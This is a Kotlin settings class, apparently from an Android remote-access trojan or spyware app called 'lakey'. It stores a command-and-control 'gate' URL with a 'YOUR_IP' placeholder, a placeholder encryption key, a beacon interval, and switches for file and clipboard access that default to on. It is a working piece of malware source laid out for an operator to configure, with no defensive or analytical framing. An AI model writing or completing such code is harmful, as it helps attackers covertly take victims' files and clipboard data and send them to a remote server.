package com.anonymousbeta.lakey.utils

import android.content.Context
import android.content.SharedPreferences

class Prefs(context: Context) {
    private val prefs: SharedPreferences =
        context.getSharedPreferences("lakey_settings", Context.MODE_PRIVATE)

    var c2Url: String
        get() = prefs.getString("c2_url", "http://YOUR_IP:8080/gate") ?: "http://YOUR_IP:8080/gate"
        set(value) = prefs.edit().putString("c2_url", value).apply()

    var encryptionKey: String
        get() = prefs.getString("enc_key", "CHANGE_THIS_TO_RANDOM_32_BYTE_KEY!!") 
            ?: "CHANGE_THIS_TO_RANDOM_32_BYTE_KEY!!"
        set(value) = prefs.edit().putString("enc_key", value).apply()

    var enableFileAccess: Boolean
        get() = prefs.getBoolean("file_access", true)
        set(value) = prefs.edit().putBoolean("file_access", value).apply()

    var enableClipboard: Boolean
        get() = prefs.getBoolean("clipboard", true)
        set(value) = prefs.edit().putBoolean("clipboard", value).apply()

    var beaconInterval: Int
        get() = prefs.getInt("beacon_interval", 30)
        set(value) = prefs.edit().putInt("beacon_interval", value).apply()
}